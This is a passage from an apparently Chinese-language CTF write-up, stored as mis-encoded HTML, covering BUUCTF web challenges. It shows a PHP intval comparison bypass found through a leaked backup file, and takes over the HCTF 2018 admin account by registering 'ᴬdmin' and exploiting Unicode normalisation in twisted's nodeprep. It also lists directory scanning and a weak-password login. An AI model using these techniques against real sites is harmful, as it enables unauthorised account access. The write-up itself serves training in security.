//234.0</p>\n</blockquote> </li></ul> </li><li> <p><strong>è§£é¢˜æ­¥éª¤</strong><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\33f90eff50044033b80fee2ea773be7b.png\"/></p> <p>ç”¨dirsearchæ‰«ä¸€ä¸‹ç›®å½•ï¼š<code>python dirsearch.py -u 3943f78f-4c3d-4d7c-8728-9f59f4527095.node4.buuoj.cn:81 -e php</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\33e58f77c1c14c6899b84c09ee7586b2.png\"/><br/> è®¿é—®index.php.bak<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\77bf3a9509db4e68ab62e1204faaf49b.png\"/><br/> å‡ºç°PHPä»£ç </p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//is_numericå‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Just num!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">//intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Try to find out source file!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre> <p>ä»£ç å®¡è®¡ï¼šé€šè¿‡keyå˜é‡getä¼ å‚ï¼Œè¦æ±‚æ­¤å˜é‡å¿…é¡»æ˜¯æ•°å­—ï¼Œä¸”å–æ•´æ•°ä¹‹åå€¼ä¸º123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3<br/> å–keyçš„å€¼ä¸º123 <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\6c27c240688b42bea1a20b17ee832614.png\"/></p> </li></ul>\n<h1><a id=\"HCTF_2018admin_807\"></a>[HCTF 2018]admin</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119577219?spm=1001.2014.3001.5501\">æ›´å¤šçŸ¥è¯†ç‚¹åŠè§£é¢˜æ–¹æ³•ç‚¹è¿™é‡Œ</a><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e3541d2cd8a94a2f86591f54514347cf.png\"/>è¿™é‡Œæœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œç‚¹å‡»registeræ³¨å†Œä¸€ä¸ªæ–°è´¦æˆ·<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\36e02c4d81494ad39c0aee964321bd58.png\"/></p>\n<p>ä¸‹é¢è¿™å°±ç®—æ˜¯ç™»è¿›æ¥äº†<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\8942320010ad45f7a5cba578f354e04c.png\"/><br/> æŸ¥çœ‹æºç </p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\11144b25a7c54fee8be5afec88eb1dc1.png\"/><br/> æç¤ºyou are not adminï¼Œå¯èƒ½éœ€è¦ç™»å½•adminæ‰èƒ½è·å–æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p>\n<p>è¯•ä¸€ä¸‹å¼±å£ä»¤ï¼Œç”¨æˆ·å<code>admin</code>,å¯†ç <code>123</code><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c2f0d504c56b4e3a8fe04ad3ce3218ee.png\"/>ç»“æœå°±è¿™ä¹ˆæˆåŠŸç™»è¿›æ¥äº†ï¼Œæ‰€ä»¥è¿™é‡Œè­¦ç¤ºæˆ‘ä»¬å¯†ç å¤æ‚ç‚¹</p>\n<p>å¥½ï¼Œä¸Šé¢æ˜¯æ’å™ï¼Œä¸‹é¢æ‰æ˜¯æ­£å¸¸è§£æ³•</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\e0c4fbe60bea4e759d9fdaeebaf3e7ed.png\"/><br/> ç™»å½•åæœ‰å››ä¸ªé€‰é¡¹<br/> ç‚¹å‡»post</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\7da4733b529b481d8c929b80478ac107.png\"/>çŒœæµ‹æ˜¯xssï¼Œç»“æœä¸€é¡¿æ“ä½œåå•¥ä¹Ÿä¸æ˜¯</p>\n<p>ä¸‹ä¸€ä¸ªé€‰é¡¹change password<br/> å‘ç°changeæºç ä¸­æœ‰ä¸€ä¸ªåœ°å€</p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\9e460a26e0874faba4c49fb4cbe02e30.png\"/><br/> è®¿é—®ä¸€ä¸‹å‘ç°æä¾›äº†ç½‘é¡µçš„æºç ,æ˜¯ä¸€ä¸ªflaské¡¹ç›®<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\befb08fd57724f33aa644e12bdbe3ef8.png\"/>æ—¢ç„¶æ˜¯flaské¡¹ç›®ï¼Œé‚£å°±å…ˆæŸ¥çœ‹ä¸€ä¸‹è·¯ç”±<br/> åœ¨APPç›®å½•é‡Œæ‰¾åˆ°<code>routes.py</code>è·¯ç”±æ–‡ä»¶</p>\n<pre><code class=\"prism language-python\"><span class=\"token comment\">#!/usr/bin/env python</span>\n<span class=\"token comment\"># -*- coding:utf-8 -*-</span>\n\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> render_template<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> flash<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> make_response\n<span class=\"token keyword\">from</span> flask_login <span class=\"token keyword\">import</span> logout_user<span class=\"token punctuation\">,</span> LoginManager<span class=\"token punctuation\">,</span> current_user<span class=\"token punctuation\">,</span> login_user\n<span class=\"token keyword\">from</span> app <span class=\"token keyword\">import</span> app<span class=\"token punctuation\">,</span> db\n<span class=\"token keyword\">from</span> config <span class=\"token keyword\">import</span> Config\n<span class=\"token keyword\">from</span> app<span class=\"token punctuation\">.</span>models <span class=\"token keyword\">import</span> User\n<span class=\"token keyword\">from</span> forms <span class=\"token keyword\">import</span> RegisterForm<span class=\"token punctuation\">,</span> LoginForm<span class=\"token punctuation\">,</span> NewpasswordForm\n<span class=\"token keyword\">from</span> twisted<span class=\"token punctuation\">.</span>words<span class=\"token punctuation\">.</span>protocols<span class=\"token punctuation\">.</span>jabber<span class=\"token punctuation\">.</span>xmpp_stringprep <span class=\"token keyword\">import</span> nodeprep\n<span class=\"token keyword\">from</span> io <span class=\"token keyword\">import</span> BytesIO\n<span class=\"token keyword\">from</span> code <span class=\"token keyword\">import</span> get_verify_code\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/code'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_code</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    image<span class=\"token punctuation\">,</span> code <span class=\"token operator\">=</span> get_verify_code<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span>\n    buf <span class=\"token operator\">=</span> BytesIO<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token string\">'jpeg'</span><span class=\"token punctuation\">)</span>\n    buf_str <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">.</span>getvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span>\n    response <span class=\"token operator\">=</span> make_response<span class=\"token punctuation\">(</span>buf_str<span class=\"token punctuation\">)</span>\n    response<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'image/gif'</span>\n    <span class=\"token comment\"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span>\n    session<span class=\"token punctuation\">[</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> code\n    <span class=\"token keyword\">return</span> response\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span>\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">index</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'index.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'hctf'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/register'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> RegisterForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">'image'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> form<span class=\"token punctuation\">.</span>verify_code<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Wrong verify code.'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form<span class=\"token operator\">=</span>form<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username <span class=\"token operator\">=</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'The username has been registered'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'register'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'register successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'register.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'register'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/login'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    form <span class=\"token operator\">=</span> LoginForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>username<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> name\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> user <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> user<span class=\"token punctuation\">.</span>check_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>password<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            flash<span class=\"token punctuation\">(</span><span class=\"token string\">'Invalid username or password'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        login_user<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> remember<span class=\"token operator\">=</span>form<span class=\"token punctuation\">.</span>remember_me<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'login.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'login'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/logout'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">logout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    logout_user<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'/index'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/change'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">change</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> current_user<span class=\"token punctuation\">.</span>is_authenticated<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'login'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    form <span class=\"token operator\">=</span> NewpasswordForm<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        name <span class=\"token operator\">=</span> strlower<span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        user <span class=\"token operator\">=</span> User<span class=\"token punctuation\">.</span>query<span class=\"token punctuation\">.</span>filter_by<span class=\"token punctuation\">(</span>username<span class=\"token operator\">=</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        user<span class=\"token punctuation\">.</span>set_password<span class=\"token punctuation\">(</span>form<span class=\"token punctuation\">.</span>newpassword<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span>\n        db<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">.</span>commit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'change successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'change.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'change'</span><span class=\"token punctuation\">,</span> form <span class=\"token operator\">=</span> form<span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/edit'</span><span class=\"token punctuation\">,</span> methods <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">:</span>\n        \n        flash<span class=\"token punctuation\">(</span><span class=\"token string\">'post successful'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span>url_for<span class=\"token punctuation\">(</span><span class=\"token string\">'index'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'edit.html'</span><span class=\"token punctuation\">,</span> title <span class=\"token operator\">=</span> <span class=\"token string\">'edit'</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>errorhandler</span><span class=\"token punctuation\">(</span><span class=\"token number\">404</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">page_not_found</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    title <span class=\"token operator\">=</span> <span class=\"token builtin\">unicode</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n    message <span class=\"token operator\">=</span> error<span class=\"token punctuation\">.</span>description\n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">'errors.html'</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span>title<span class=\"token punctuation\">,</span> message<span class=\"token operator\">=</span>message<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">strlower</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    username <span class=\"token operator\">=</span> nodeprep<span class=\"token punctuation\">.</span>prepare<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> username\n</code></pre>\n<p>ç„¶åæˆ‘å°±æ²¡ä»€ä¹ˆæ€è·¯äº†ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹å¤§ä½¬ä»¬çš„è§£é¢˜æ–¹æ³•</p>\n<ul><li><strong>ä»£ç å®¡è®¡</strong>ï¼šè¿™é‡Œé‡ç‚¹è¦æ³¨æ„ä»¥ä¸‹<code>strlower()</code>å‡½æ•°ï¼Œå…¶ä¸­è°ƒç”¨<code>nodeprep.prepare</code>å‡½æ•°ï¼Œåœ¨ä»£ç å¼€å¤´æœ‰ä¸€è¡Œä»£ç ï¼š<code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code>ï¼Œè¯´æ˜<code>nodeprep</code>æ˜¯ä»<code>twistedæ¨¡å—</code>ä¸­å¯¼å…¥çš„ï¼Œåˆ©ç”¨<code>nodeprep.prepare</code>å‡½æ•°ä¼šå°†unicodeå­—ç¬¦<code>á´¬</code>è½¬æ¢æˆ<code>A</code>ï¼Œè€Œ<code>A</code>åœ¨è°ƒç”¨ä¸€æ¬¡<code>nodeprep.prepare</code>å‡½æ•°ä¼šæŠŠ<code>A</code>è½¬æ¢æˆ<code>a</code>ã€‚è€Œå€¼å¾—æ³¨æ„çš„æ˜¯<code>strlower()</code>è‡ªå®šä¹‰å‡½æ•°è¢«è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œåˆ†åˆ«æ˜¯<code>register</code>ã€<code>login</code>ã€<code>change</code>ï¼Œå³æ³¨å†Œã€ç™»é™†ã€ä¿®æ”¹å¯†ç æ—¶éƒ½ä¼šè¢«è°ƒç”¨ã€‚</li><li><strong>æ€è·¯</strong>ï¼šç”¨<code>á´¬dmin</code>æ³¨å†Œï¼Œåå°ä»£ç å°±ä¼šè°ƒç”¨ä¸€æ¬¡<code>nodeprep.prepare</code>å‡½æ•°ï¼ŒæŠŠç”¨æˆ·åè½¬æ¢æˆ<code>Admin</code>ï¼›ä¿®æ”¹ä¸€æ¬¡å¯†ç ï¼Œå†æ¬¡è°ƒç”¨<code>nodeprep.prepare</code>å‡½æ•°ï¼Œä½¿ç”¨æˆ·åç”±<code>Admin</code>è½¬æ¢ä¸º<code>admin</code>ï¼Œé‡æ–°ç™»é™†ï¼Œå°±å¯ä»¥å¾—åˆ°flag</li></ul>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\d1461ea8cf2a475092da1bc493e00c67.png\"/><br/> ç™»é™†<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\960f6dec9244445a9831c0de5d47ceaa.png\"/><br/> è¿›å…¥ä¹‹åè‡ªåŠ¨å°†<code>á´¬dmin</code>è½¬æ¢ä¸º<code>Admin</code><br/> ç„¶åä¿®æ”¹å¯†ç é‡æ–°ç™»é™†<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\cdb61e31a88b48dc9ba0594f7bb54e02.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\df2c51a43f31425fbe01366557ecd8a1.png\"/>æ‹¿åˆ°flag~~</p>\n<h1><a id=\"_2019BuyFlag_964\"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h1>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\89cd5d764cac40f2a9041f5e9b02da38.png\"/></p>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\c2d17874bd884729a2e97d30b3d19436.png\"/><br/> æŸ¥çœ‹æºç <br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"..\\..\\static\\image\\58b8352df4ef4edeb3cdc0c4af51a10d.png\"/><br/> ä»£ç 